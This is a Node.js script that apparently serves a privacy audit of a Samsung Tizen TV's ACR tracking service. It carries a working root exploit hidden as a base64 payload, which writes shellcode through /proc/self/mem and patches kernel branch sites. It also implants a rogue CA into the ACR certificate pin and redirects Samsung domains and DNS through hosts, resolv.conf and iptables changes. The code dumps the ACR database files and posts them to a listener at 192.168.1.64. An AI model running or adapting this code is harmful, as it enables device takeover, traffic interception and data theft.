"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 3000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var G12_B64 = "dmFyIGZzID0gcmVxdWlyZSgiZnMiKTsNCnZhciBodHRwID0gcmVxdWlyZSgiaHR0cCIpOw0KdmFyIGNwID0gcmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpOw0KDQp2YXIgVFJBTVAzX0I2NCA9ICJCQUJTNHdvQUFMb0F3TkhsTXdCYzR3Y0FBQm9Cd05IbFJ3QmM0d1FBQUJvUVFDM3BFRUNmNVFBQW9PTTAveS9oRUlDOTZBVEFuK1VjL3kvaExRVUNBTHkrSVFBPSI7DQp2YXIgU0MzX0I2NCA9ICJMZW53VHdBaWtVdVRzQlJHQnFnVlJnSWhCU2NHazZQeEwyT2o5WFpEQjVPTFN3aVRFMFlBMzdEeEFBd00ya2J5YlZDdCtDQUFiU0NOK0NJQUJxZ0EzN0R4QUF6QTh2V0FUL0FBQzlwR1QvQk5VODM0QkxETitCQ3dUL0JBZU0zNENMQURrd0FtQTV1WVJTYlRlVXRQOEFCSUE1Tzc4UUFQSE5BQUlXQkdDa1lMUmd4R0RVWUdKd0RmQXBzQUswRHcwb0FFbXdBclFQRFFnTHJ4QUE4QThNQ0F1dkU3RHdEenlvQUs5ZnB3RTdDOTZQQ1BUL0FCQzlUbkE1dFA4QUFKbytzSURyNzFnQjhvdjAvMGdCNVA2cDREQlpQTjZRcG16ZWtNWnMzcERtYk42UkJtdWZFQUR4alJ6ZWtNamdBaldVbGdSZ3FxSEVZZFJqWW5BTjhJdXdBZ2NVWmtSZ1ZHQXlJQkk4QW5BTjhEUmhEMWdGOSsyQWtpWmVDNThRRVBBdEhOK0NpUTRPZTU4UUlQQk5ITitEQ0F6Zmc0NE5ybnVmRUREOWZSQVNNS2svVG5SVWxnUmdEZkFDalkwQUgxNENGZ1JnRXhBTjhBS05IUUFab0FLazdSUTBJQmswdmdHV2dCT2JIMWdGODQwaGtkQkpGWmFFSHlpVFNoUWpIUkEvRUlBUVNSbVdoa0tTdlJBL0VNQVFTUjJXaWhRaVhSQS9FUUFRU1JHV2xrS1IvUkEvRVVBUVNSV1dtaFFoblJtV2xrS1JiUkEvRWNBUVNSMldrTlJrSHlpVEdOUWczUkdXcGtLUXJSQXBsZVlBRXhubUFDa2Q1Z0htRmVZWjVoM21FZVlnRXlCRE1GbVpGQ3ZOZ0FJbkZHRTBZVVJoVkdXeWNBM3dFbEJKVUo4UUVKdWZFRUR3TFFBQzAvOUdLdkNQV0FHQ2ZudXZFQUQvSFJ3UEVBQ3U3bkFac0JPem9yRE5nQm13UDF5SEE5NXdvZ08rY0lSam5uRkNBMzUwLzArbkEwNTAvMHlIQXg1d0MvTDJSbGRuTjVjd0FBQUlDYUFYTVF3QUJ6RU1BPSI7DQp2YXIgU0NfQUREUiA9IDB4MjA1MmM7DQp2YXIgVFJBTVBfQUREUiA9IDB4OWJlZDUwOw0KdmFyIFNJVEVfQSA9IDB4N2FlZjFjOw0KdmFyIFNJVEVfQiA9IDB4N2FmMmQwOw0KdmFyIE9SSUdfQSA9IFsweGU2LCAweGIzLCAweGU5LCAweGViXTsNCnZhciBPUklHX0IgPSBbMHhmOSwgMHhiMiwgMHhlOSwgMHhlYl07DQp2YXIgSE9TVCA9ICIxOTIuMTY4LjEuNjQiOw0KdmFyIFBPUlQgPSA5OTk5Ow0KdmFyIE1BR0lDID0gbmV3IEJ1ZmZlcihbMHgzMywgMHg0NywgMHg1NCwgMHg1M10pOw0KDQp2YXIgbG9nRmQgPSBudWxsOw0KZnVuY3Rpb24gbG9nKG1zZykgeyB0cnkgeyBmcy53cml0ZVN5bmMoZnMub3BlblN5bmMoIi90bXAvZzYubG9nIiwgImEiKSwgbmV3IERhdGUoKS50b0lTT1N0cmluZygpICsgIiAiICsgbXNnICsgIlxuIik7IH0gY2F0Y2ggKGUpIHt9IH0NCmZ1bmN0aW9uIHBvc3QocGF0aCwgYm9keSkgew0KICAgIHZhciBkYXRhID0gSlNPTi5zdHJpbmdpZnkoYm9keSk7DQogICAgdmFyIHJlcSA9IGh0dHAucmVxdWVzdCh7IGhvc3Q6IEhPU1QsIHBvcnQ6IFBPUlQsIHBhdGg6IHBhdGgsIG1ldGhvZDogIlBPU1QiLA0KICAgICAgICBoZWFkZXJzOiB7ICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsICJDb250ZW50LUxlbmd0aCI6IEJ1ZmZlci5ieXRlTGVuZ3RoKGRhdGEpIH0gfSwNCiAgICAgICAgZnVuY3Rpb24gKHJlcykgeyBjb25zb2xlLmxvZygicG9zdGVkICIgKyBwYXRoICsgIiAtPiAiICsgcmVzLnN0YXR1c0NvZGUpOyB9KTsNCiAgICByZXEub24oImVycm9yIiwgZnVuY3Rpb24gKGUpIHsgY29uc29sZS5sb2coInBvc3QgZXJyb3IgIiArIGUubWVzc2FnZSk7IH0pOw0KICAgIHJlcS53cml0ZShkYXRhKTsNCiAgICByZXEuZW5kKCk7DQp9DQoNCmZ1bmN0aW9uIGJ1ZjQoYnl0ZXMpIHsNCiAgICB2YXIgYiA9IG5ldyBCdWZmZXIoNCk7DQogICAgZm9yICh2YXIgaSA9IDA7IGkgPCA0OyBpKyspIGJbaV0gPSBieXRlc1tpXTsNCiAgICByZXR1cm4gYjsNCn0NCg0KZnVuY3Rpb24gYmxXb3JkKHNpdGUsIHRhcmdldCkgew0KICAgIHZhciBvZmYgPSAodGFyZ2V0IC0gKHNpdGUgKyA4KSkgPj4gMjsNCiAgICB2YXIgdyA9IG5ldyBCdWZmZXIoNCk7DQogICAgd1swXSA9IG9mZiAmIDB4ZmY7DQogICAgd1sxXSA9IChvZmYgPj4gOCkgJiAweGZmOw0KICAgIHdbMl0gPSAob2ZmID4+IDE2KSAmIDB4ZmY7DQogICAgd1szXSA9IDB4ZWI7DQogICAgcmV0dXJuIHc7DQp9DQoNCnZhciBvdXQgPSB7fTsNCm91dC5zdGFydGVkID0gbmV3IERhdGUoKS50b0lTT1N0cmluZygpOw0Kb3V0LnBpZCA9IHByb2Nlc3MucGlkOw0KbG9nKCJzdGFydCBwaWQ9IiArIHByb2Nlc3MucGlkKTsNCm91dC51aWRfYmVmb3JlID0gcHJvY2Vzcy5nZXR1aWQoKTsNCg0KdmFyIG1lbSA9IGZzLm9wZW5TeW5jKCIvcHJvYy9zZWxmL21lbSIsICJyKyIpOw0KZnVuY3Rpb24gcmVhZE1lbShhZGRyLCBsZW4pIHsgdmFyIGIgPSBuZXcgQnVmZmVyKGxlbik7IGZzLnJlYWRTeW5jKG1lbSwgYiwgMCwgbGVuLCBhZGRyKTsgcmV0dXJuIGI7IH0NCmZ1bmN0aW9uIHdyaXRlTWVtKGFkZHIsIGJ1ZikgeyBmcy53cml0ZVN5bmMobWVtLCBidWYsIDAsIGJ1Zi5sZW5ndGgsIGFkZHIpOyB9DQpmdW5jdGlvbiBlcShhLCBiKSB7IGZvciAodmFyIGkgPSAwOyBpIDwgYi5sZW5ndGg7IGkrKykgeyBpZiAoYVtpXSAhPT0gYltpXSkgcmV0dXJuIGZhbHNlOyB9IHJldHVybiB0cnVlOyB9DQoNCmZ1bmN0aW9uIHJlc3RvcmUoKSB7DQogICAgdHJ5IHsgd3JpdGVNZW0oU0lURV9BLCBidWY0KE9SSUdfQSkpOyB3cml0ZU1lbShTSVRFX0IsIGJ1ZjQoT1JJR19CKSk7IG91dC5yZXN0b3JlZCA9IHRydWU7IH0NCiAgICBjYXRjaCAoZSkgeyBvdXQucmVzdG9yZWQgPSAiRVJSICIgKyBlLm1lc3NhZ2U7IH0NCn0NCg0KdHJ5IHsNCiAgICB2YXIgbWFwcyA9IGZzLnJlYWRGaWxlU3luYygiL3Byb2Mvc2VsZi9tYXBzIiwgInV0ZjgiKTsNCiAgICBvdXQubm9kZV90ZXh0X29rID0gbWFwcy5pbmRleE9mKCIwMDAxMDAwMC0wMDliZjAwMCByLXhwIDAwMDAwMDAwIikgPj0gMDsNCiAgICBvdXQuc2l0ZV9hX2J5dGVzID0gcmVhZE1lbShTSVRFX0EsIDQpLnRvU3RyaW5nKCJoZXgiKTsNCiAgICBvdXQuc2l0ZV9iX2J5dGVzID0gcmVhZE1lbShTSVRFX0IsIDQpLnRvU3RyaW5nKCJoZXgiKTsNCiAgICB2YXIgZ3ogPSByZWFkTWVtKFNDX0FERFIsIDgpOw0KICAgIG91dC5nYXBfemVybyA9IHRydWU7DQogICAgZm9yICh2YXIgaSA9IDA7IGkgPCBnei5sZW5ndGg7IGkrKykgeyBpZiAoZ3pbaV0gIT09IDApIHsgb3V0LmdhcF96ZXJvID0gZmFsc2U7IGJyZWFrOyB9IH0NCiAgICB2YXIgdHogPSByZWFkTWVtKFRSQU1QX0FERFIsIDgpOw0KICAgIG91dC50cmFtcF96ZXJvID0gdHJ1ZTsNCiAgICBmb3IgKHZhciBpID0gMDsgaSA8IHR6Lmxlbmd0aDsgaSsrKSB7IGlmICh0eltpXSAhPT0gMCkgeyBvdXQudHJhbXBfemVybyA9IGZhbHNlOyBicmVhazsgfSB9DQogICAgdHJ5IHsNCiAgICAgICAgdmFyIG5mZCA9IGZzLm9wZW5TeW5jKCIvZGV2L250a3N5cyIsICJyKyIpOw0KICAgICAgICBvdXQubnRrc3lzID0gIm9rIGZkPSIgKyBuZmQ7DQogICAgICAgIGZzLmNsb3NlU3luYyhuZmQpOw0KICAgIH0gY2F0Y2ggKGUpIHsgb3V0Lm50a3N5cyA9ICJFUlIgIiArIGUubWVzc2FnZTsgfQ0KICAgIGxvZygiZGlhZyAiICsgSlNPTi5zdHJpbmdpZnkob3V0KS5zbGljZSgwLCA0MDApKTsNCiAgICBwb3N0KCIvZzI3X2RpYWciLCBvdXQpOw0KDQogICAgaWYgKCFvdXQuZ2FwX3plcm8pIHRocm93IG5ldyBFcnJvcigiZ2FwIG5vdCB6ZXJvOiAiICsgb3V0LmdhcF96ZXJvKTsNCg0KICAgIHZhciBzY0J1ZiA9IG5ldyBCdWZmZXIoU0MzX0I2NCwgImJhc2U2NCIpOw0KICAgIHZhciB0cmFtcEJ1ZiA9IG5ldyBCdWZmZXIoVFJBTVAzX0I2NCwgImJhc2U2NCIpOw0KICAgIHdyaXRlTWVtKFNDX0FERFIsIHNjQnVmKTsNCiAgICBvdXQuc2Nfd3JpdHRlbiA9IGVxKHJlYWRNZW0oU0NfQUREUiwgOCksIHNjQnVmLnNsaWNlKDAsIDgpKTsNCiAgICB3cml0ZU1lbShUUkFNUF9BRERSLCB0cmFtcEJ1Zik7DQogICAgb3V0LnRyYW1wX3dyaXR0ZW4gPSBlcShyZWFkTWVtKFRSQU1QX0FERFIsIDgpLCB0cmFtcEJ1Zi5zbGljZSgwLCA4KSk7DQoNCiAgICB2YXIgd2EgPSBibFdvcmQoU0lURV9BLCBUUkFNUF9BRERSKTsNCiAgICB2YXIgd2IgPSBibFdvcmQoU0lURV9CLCBUUkFNUF9BRERSKTsNCiAgICB3cml0ZU1lbShTSVRFX0EsIHdhKTsNCiAgICB3cml0ZU1lbShTSVRFX0IsIHdiKTsNCiAgICBvdXQucGF0Y2hlZCA9IGVxKHJlYWRNZW0oU0lURV9BLCA0KSwgd2EpICYmIGVxKHJlYWRNZW0oU0lURV9CLCA0KSwgd2IpOw0KICAgIG91dC5ibF93b3JkcyA9IHdhLnRvU3RyaW5nKCJoZXgiKSArICIsIiArIHdiLnRvU3RyaW5nKCJoZXgiKTsNCiAgICBsb2coInBhdGNoZWQgIiArIG91dC5wYXRjaGVkICsgIiBzYz0iICsgb3V0LnNjX3dyaXR0ZW4gKyAiIHRyYW1wPSIgKyBvdXQudHJhbXBfd3JpdHRlbik7DQogICAgcG9zdCgiL2cyN19wYXRjaGVkIiwgb3V0KTsNCg0KICAgIHZhciBkZXZudWxsID0gZnMub3BlblN5bmMoIi9kZXYvbnVsbCIsICJ3Iik7DQogICAgdmFyIHQwID0gRGF0ZS5ub3coKTsNCiAgICBsb2coInRyaWdnZXIgZ28iKTsNCiAgICBvdXQudHJpZ2dlcl9yZXQgPSBmcy53cml0ZVN5bmMoZGV2bnVsbCwgTUFHSUMsIDAsIDQsIDApOw0KICAgIGxvZygidHJpZ2dlciByZXQ9IiArIG91dC50cmlnZ2VyX3JldCk7DQogICAgb3V0LnNjYW5fbXMgPSBEYXRlLm5vdygpIC0gdDA7DQoNCiAgICByZXN0b3JlKCk7DQogICAgb3V0LnNpdGVfYV9hZnRlciA9IHJlYWRNZW0oU0lURV9BLCA0KS50b1N0cmluZygiaGV4Iik7DQoNCiAgICBvdXQudWlkX2FmdGVyID0gcHJvY2Vzcy5nZXR1aWQoKTsNCg0KICAgIGlmIChvdXQudWlkX2FmdGVyID09PSAwKSB7DQogICAgICAgIHRyeSB7IGZzLndyaXRlRmlsZVN5bmMoIi9wcm9jL3NlbGYvYXR0ci9jdXJyZW50IiwgIioiKTsgb3V0LnNtYWNrX3N0YXIgPSAic2V0IjsgfQ0KICAgICAgICBjYXRjaCAoZSkgeyBvdXQuc21hY2tfc3RhciA9ICJFUlIgIiArIGUubWVzc2FnZTsgfQ0KICAgICAgICB0cnkgeyBvdXQuaWQgPSBjcC5leGVjU3luYygiaWQgMj4mMSIpLnRvU3RyaW5nKCk7IH0gY2F0Y2ggKGUpIHsgb3V0LmlkID0gIkVSUiI7IH0NCiAgICAgICAgdHJ5IHsgb3V0LmNhcHMgPSBjcC5leGVjU3luYygiZ3JlcCAtaSBjYXAgL3Byb2Mvc2VsZi9zdGF0dXMgMj4mMSIpLnRvU3RyaW5nKCk7IH0gY2F0Y2ggKGUpIHt9DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBvdXQuYWNyX2xzID0gY3AuZXhlY1N5bmMoImxzIC1sYVIgL29wdC91c3IvaG9tZS9vd25lci9hcHBzX3J3L29yZy50aXplbi5hY3Itc2VydmljZS1hcHAvIDI+JjEgfCBoZWFkIC02MCIpLnRvU3RyaW5nKCk7DQogICAgICAgIH0gY2F0Y2ggKGUpIHsgb3V0LmFjcl9scyA9ICJFUlIgIiArIGUubWVzc2FnZTsgfQ0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgb3V0LnJvb3RfcHJvb2YgPSBjcC5leGVjU3luYygibHMgLWxhIC9yb290LyAyPiYxIHwgaGVhZCAtODsgZWNobyA9PT07IGxzIC1sYSAvb3B0L2Ric3BhY2UvIDI+JjEgfCBncmVwIC1pIGFjciB8IGhlYWQ7IGVjaG8gPT09OyBscyAtbGEgL29wdC91c3IvaG9tZS9vd25lci9hcHBzX3J3L29yZy50aXplbi5hY3Itc2VydmljZS1hcHAvZGF0YSAyPiYxIHwgaGVhZCAtMjAiKS50b1N0cmluZygpOw0KICAgICAgICB9IGNhdGNoIChlKSB7IG91dC5yb290X3Byb29mID0gIkVSUiI7IH0NCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIG91dC5hY3JfZmlsZXMgPSBjcC5leGVjU3luYygiZm9yIGYgaW4gJChmaW5kIC9vcHQvdXNyL2hvbWUvb3duZXIvYXBwc19ydy9vcmcudGl6ZW4uYWNyLXNlcnZpY2UtYXBwIC10eXBlIGYgLW5hbWUgJyouZGInIDI+L2Rldi9udWxsIHwgaGVhZCAtMyk7IGRvIGVjaG8gRklMRTokZjsgYmFzZTY0ICRmIHwgaGVhZCAtYyA0MDAwOyBlY2hvOyBkb25lIDI+JjEiKS50b1N0cmluZygpOw0KICAgICAgICB9IGNhdGNoIChlKSB7IG91dC5hY3JfZmlsZXMgPSAiRVJSIjsgfQ0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgb3V0Lm1vcmUgPSBjcC5leGVjU3luYygibHMgLWxhIC9vcHQvdXNyL2hvbWUvb3duZXIvZGF0YS8gMj4mMSB8IGhlYWQgLTEwOyBlY2hvID09PTsgY2F0IC9wcm9jL3NlbGYvc3RhdHVzIHwgaGVhZCAtMTIiKS50b1N0cmluZygpOw0KICAgICAgICB9IGNhdGNoIChlKSB7IG91dC5tb3JlID0gIkVSUiI7IH0NCiAgICB9DQogICAgb3V0LnN1Y2Nlc3MgPSBvdXQudWlkX2FmdGVyID09PSAwOw0KICAgIGxvZygicmVzdWx0IHVpZD0iICsgb3V0LnVpZF9hZnRlciArICIgcmV0PSIgKyBvdXQudHJpZ2dlcl9yZXQpOw0KICAgIHBvc3QoIi9nMjdfcmVzdWx0Iiwgb3V0KTsNCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uICgpIHsgcHJvY2Vzcy5leGl0KDApOyB9LCAyNTAwKTsNCn0gY2F0Y2ggKGUpIHsNCiAgICB0cnkgeyByZXN0b3JlKCk7IH0gY2F0Y2ggKGUyKSB7fQ0KICAgIG91dC5lcnJvciA9ICIiICsgKGUgJiYgZS5zdGFjayA/IGUuc3RhY2sgOiBlKTsNCiAgICBvdXQudWlkX2FmdGVyID0gcHJvY2Vzcy5nZXR1aWQoKTsNCiAgICBsb2coIkVSUk9SICIgKyBvdXQuZXJyb3IpOw0KICAgIHBvc3QoIi9nMjdfZXJyb3IiLCBvdXQpOw0KICAgIHNldFRpbWVvdXQoZnVuY3Rpb24gKCkgeyBwcm9jZXNzLmV4aXQoMik7IH0sIDE1MDApOw0KfQ0K";
var CA_PEM = "%s";

var out = {};
out.started = new Date().toISOString();
var pem = CA_PEM.replace(/\\n/g, "\n") + "\n";

var PIN = "/usr/lib/acr/cert/ca.pem";
try {
    var cur = fs.readFileSync(PIN, "utf8");
    if (cur.indexOf("TV Privacy Audit Root CA") >= 0) {
        out.pin = "already";
    } else {
        fs.writeFileSync(PIN + ".bak", cur);
        fs.appendFileSync(PIN, pem);
        out.pin = "PATCHED size=" + fs.statSync(PIN).size;
    }
} catch (e) { out.pin = "ERR " + e.message; }

out.steer = {};
try {
    var resolv = "/opt/etc/resolv.conf";
    var r = fs.readFileSync(resolv, "utf8");
    out.steer.resolv_before = r.slice(0, 120);
    if (r.indexOf("192.168.1.64") < 0) {
        fs.writeFileSync(resolv + ".bak", r);
        fs.writeFileSync(resolv, "nameserver 192.168.1.64\nnameserver 8.8.8.8\n");
        out.steer.resolv = "WRITTEN";
    } else out.steer.resolv = "already";
} catch (e) { out.steer.resolv = "ERR " + e.message; }

try {
    var hosts = "/etc/hosts";
    var h = fs.readFileSync(hosts, "utf8");
    if (h.indexOf("TV-AUDIT-MITM") < 0) {
        fs.appendFileSync(hosts, "\n# TV-AUDIT-MITM\n192.168.1.64 acr0.samsungcloudsolution.com\n192.168.1.64 log-ingestion-v2-ap2.samsungacr.com\n192.168.1.64 acr.samsungcloudsolution.com\n192.168.1.64 config.samsungcloud.tv\n");
        out.steer.hosts = "APPENDED";
    } else out.steer.hosts = "already";
} catch (e) { out.steer.hosts = "ERR " + e.message; }

out.ipt_try = sh("iptables -t nat -A OUTPUT -p udp --dport 53 -j DNAT --to-destination 192.168.1.64:15353 2>&1 && echo IPT_OK");
post("/acr_ca_patch", out);

var code = new Buffer(G12_B64, "base64").toString("utf8");
var stdout = "";
var stderr = "";
var child = cp.spawn("/usr/bin/node", ["-e", code]);
child.stdout.on("data", function (d) { stdout += d; });
child.stderr.on("data", function (d) { stderr += d; });
child.on("exit", function (rc, sig) {
    var o = { rc: rc, signal: sig, stdout: stdout.slice(0, 800), stderr: stderr.slice(0, 800) };
    try { o.g6log = fs.readFileSync("/tmp/g6.log", "utf8"); } catch (e) { o.g6log = "ERR"; }
    post("/acr_root_run", o);
});
setTimeout(function () {
    var o = { timer: "120s" };
    try { o.g6log = fs.readFileSync("/tmp/g6.log", "utf8"); } catch (e) { o.g6log = "ERR"; }
    o.id_now = sh("id");
    post("/acr_root_snap", o);
}, 120000);
